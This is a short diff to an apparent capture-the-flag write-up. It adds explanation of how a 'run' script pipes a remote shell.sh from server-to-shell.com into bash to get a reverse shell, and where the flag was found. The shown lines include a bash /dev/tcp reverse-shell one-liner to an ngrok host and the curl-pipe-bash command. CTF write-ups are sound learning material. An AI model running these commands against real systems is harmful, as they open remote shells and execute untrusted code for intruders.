@@ -69,6 +69,7 @@ The first file was the `shell.sh` where i upload it into a web server so i can r
 bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12771 0>&1
 ```
 
+This source code below is the `run` executable where with the `curl` command we get the source code of `shell.sh` and pipeline it with `bash` command and successfully get the reverse shell .
 ```bash
 #!/bin/bash
 # run executable
@@ -76,7 +77,9 @@ bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12771 0>&1
 curl http://server-to-shell.com/shell.sh|bash
 ```
 
-![rev_shell](https://user-images.githubusercontent.com/45040001/188512834-833e9ba4-3db1-43de-8a8f-dc7e1ae3cd84.png)
+![rev_shell](https://user-images.githubusercontent.com/45040001/188512834-833e9ba4-3db1-43de-8a8f-dc7e1ae3cd84.png) <br>
+
+We can retrive the flag in the `__pycache__` directory.
 ![flag](https://user-images.githubusercontent.com/45040001/188512842-48603fcf-de87-439a-8168-dc3fcd5be75e.png)
 
 
